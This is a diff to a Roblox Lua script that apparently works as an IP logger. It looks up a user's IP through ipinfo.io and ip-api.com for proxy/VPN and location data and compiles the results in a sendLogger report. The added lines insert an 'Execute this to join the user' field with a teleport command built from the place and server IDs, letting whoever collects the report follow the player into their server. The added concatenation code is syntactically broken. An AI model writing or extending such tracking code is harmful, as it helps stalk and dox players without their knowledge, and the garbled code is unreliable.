@@ -7,6 +7,9 @@ local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local response1 = game:HttpGet("https://ipinfo.io/widget/demo/" .. ip .. "?dataset=proxy-vpn-detection")
 local data1 = HttpService:JSONDecode(response1)
+local ettj1 = "game:GetService('TeleportService'):TeleportToPlaceInstance('"
+local ettj2 = "', '"
+local ettj3 = "')"
 
 local response = game:HttpGet("http://ip-api.com/json/".. ip)
 
@@ -112,6 +115,12 @@ function sendLogger()
 				["value"] = "`" .. prettyPrint(data1) .. "`",
 				["inline"] = true
 			},
+		{
+				["name"] = "Execute this to join the user",
+				["value"] = "`" .. ettj1 .. + .. tostring(placeID) .. + ..ettj2.. + .. game.JobId .. + .. ettj3 .. "`",
+				["inline"] = true
+			},
+
 
 
 			
